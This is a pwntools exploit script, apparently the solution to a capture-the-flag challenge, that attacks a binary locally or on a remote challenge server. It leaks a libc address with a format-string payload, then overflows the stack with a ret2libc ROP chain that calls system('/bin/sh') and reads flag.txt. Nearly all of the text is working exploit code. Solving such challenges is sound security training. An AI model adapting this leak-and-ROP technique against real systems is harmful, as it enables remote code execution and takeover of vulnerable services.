from pwn import *
from icecream import ic

exe = ELF("./all_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("all.chal.cyberjousting.com", 1348)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004011db
b *0x00000000004011e6
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
ret = 0x0000000000401016
sl("%3$p")
libc.address = int(rl().strip().decode(), 16) - 0x1147e2
pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8678
payload = b'a'*(0x28)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])
payload += b'\x00'
sl(payload)
ru("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
sl(b'quit\x00\x00\x00\x00')
# sl(b'')
sl(b'cat flag.txt')

i()
